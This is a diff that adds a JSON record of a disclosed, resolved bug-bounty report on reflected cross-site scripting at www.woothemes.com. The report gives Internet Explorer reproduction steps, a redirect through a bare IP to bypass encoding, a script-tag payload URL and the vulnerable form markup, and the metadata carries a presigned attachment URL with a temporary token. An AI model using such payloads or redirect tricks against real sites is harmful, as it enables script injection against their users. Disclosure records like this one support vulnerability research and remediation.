@@ -1,0 +1,113 @@
+{
+  "id": 111365,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNjU=",
+  "url": "https://hackerone.com/reports/111365",
+  "title": "XSS at www.woothemes.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-01-18T07:05:59.393Z",
+  "submitted_at": "2016-01-18T07:05:59.393Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "valievkarim",
+    "url": "/valievkarim",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-02-19T10:20:43.468Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-01-20T10:20:28.989Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This XSS vulnerability can be used against IE browsers.\nThere is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1), or take an old browser without XSS filter (IE7). \nBypassing an XSS filter in IE will not be covered in this report.\n\nTested with IE11 with XSS filter disabled and with IE7.\nThe redirect is used to bypass query string encoding.\n\n1) Visit http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n2) It redirects to http://www.woothemes.com/product-category/woocommerce-extensions/?\"><script>alert(document.domain)</script>\n3) the alert is shown on www.woothemes.com\n\nThe vulnerable URL:\nhttp://www.woothemes.com/product-category/woocommerce-extensions/?\"><script>alert(document.domain)</script>\n\nThe vulnerability occurs because the 'action' attribute is not properly filtered at the page:\n\n    <form class=\"search\" id=\"productSearchForm\" action=\"/product-category/woocommerce-extensions/?23946\\\"><script>alert(1)</script>0a7f2=1\">\n\nScreenshot is attached.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 69752,
+      "file_name": "woothemes-xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/069/752/e5ef011738b4d54dde79fcddd4f6cddb5402240d/woothemes-xss.png?response-content-disposition=attachment%3B%20filename%3D%22woothemes-xss.png%22%3B%20filename%2A%3DUTF-8%27%27woothemes-xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3UWTM2JP%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T124612Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGdhC6%2FanwtokSgJ1N4DxXnFw8oRLsXyPSjtzMzH24MqAiBr8mW5aKHLpt7NSzuyLqCENtmW8Xmu1bwWWVOpVFV64SqxBQgtEAMaDDAxMzYxOTI3NDg0OSIMwBmZc7TG%2FCWzn50wKo4F80Cy4x10d7yUofIU83vqp%2FbaC7j%2BJOSRFJOev4uUlp31nrliAfV1p%2FC8kBfleTHKHKxpYq5NDIobaoLA4TmHgNk7UYvKLGLs93tb7K%2B%2F5RCQYlk2rTqGvxTuUnf87Q6NYJ4X6AGjXwF3NDRDNw0UUe%2FzfqcD3OpmtwKEk1N%2Fn6FyhTA52sRuUcPqaXk%2FY7BPPttTUuXesS4UX1%2FGFfCTpYoGZ43ozHRYXNgbg5C%2F3q1Cb%2Fr3LrjoC%2BKUEN084KeC%2F7N1HbjtsehOwBYk6r%2Flqv%2BNzj0UhK%2BI9hRdWUxrH0mzpNzBomXhqwdWZCz9WPKEn5rwDvq4PVujrK3iyuOTWPIMgMVDSjDwDdMAWY0SC4uuQzN2pW4E2gq4ZwfvIqYMpB1U9JhsCyX%2B0ngysjnfwAGnh%2Fh4vMmg8OIe11ICwPTkkavxQlGkpjsvDOKTKOYcFvtcrOcnQaNPicjojQfGbwYdWqHSxVA%2FzudBnNsgCeUahW5gavBYI9iQAig9IUwgNwxKNV9nQmOkcdYYPFlQBb2LatElwlyguoSSDVuLJhhuzbcyISHIyoNLTTZzK5czS8m5llSGCqedJAmIZEFBfqVQzUiyBIr78ApCQ51PSzZ43FnliC0Kr9th1m%2BpAawuCwTn5MMK71S37D8hFy3B2lrDezljsDCsz4IAlTbxPmsDOpMOkByufPnsQsI1He0fC1BWsUhcGu8F767hMgjWCYRb9gQbhWm7MQnGWOgCddPKgf4Y5ihUcw%2Flr7VCo08dRmm6SqiO7xZRmUegD8gtfj1pBC5%2B8UPLPgzaqN0dhQvJhQeqY1SaeeWlVLHtV3zy4OIL3I%2FFhTbl48wvNy3zho0LHvvM%2BkFg8wkt67imMIj8xMYGOrIBqWNWbADI7IiUVHNgHpQCWP9%2Fbf4DZ9JHwDiANcvR5MsXI2UwfHRk8dmAhfsrbWMUTKVEN4HPC6TAJCt1ymiq1qyIK%2Fh4WrgcSvx3awr0mGD0eCnJ%2Bv4wB3xjmIMUhmOagYy8ecxuizYJ6LetM%2B1VMXrSuA4AlooSGT5i4H%2BgZkwN87km7nkmVXa2cp67HR%2BAVYtX6wWW8z4zHmu0FtVW2V2%2FmpdYwcytHcD46XIqipVCjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6a1bfc7e2c87eef243425e4f94d9d849fc0c411805a6e2d1a8d57c5e828d06d9",
+      "file_size": 93747,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-02-19T10:20:29.661Z",
+  "allow_singular_disclosure_after": -302667942.79346305,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "arist0phanes",
+    "sl1m",
+    "spetr0x"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
